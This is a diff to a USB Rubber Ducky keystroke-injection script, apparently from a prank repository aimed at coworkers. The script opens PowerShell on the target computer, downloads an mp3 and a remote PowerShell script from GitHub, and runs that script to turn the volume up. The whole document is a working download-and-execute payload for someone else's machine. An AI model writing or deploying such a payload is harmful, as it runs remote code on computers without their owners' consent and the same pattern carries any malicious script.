@@ -1,11 +1,17 @@
 REM Created by Cody Bernardy
 REM Downloads your favorite song, programatically turns the volume up and plays :)
+REM Needs further testing
 REM Author holds no liability 
 
 DEFAULT_DELAY
 GUI
 STRING powershell
 ENTER
-STRING wget https://your_favorite_mp3_file.mp3
+STRING wget https://your_favorite_mp3_file.mp3 > your_favorite.mp3
 ENTER
-STRING wget 
+STRING wget https://raw.githubusercontent.com/stbernardy/Piss_Off_CoWorkers_Ducky_Scripts/master/volume.ps1 > volume.ps1
+ENTER
+STRING exit
+GUI
+STRING volume.ps1
+ENTER 
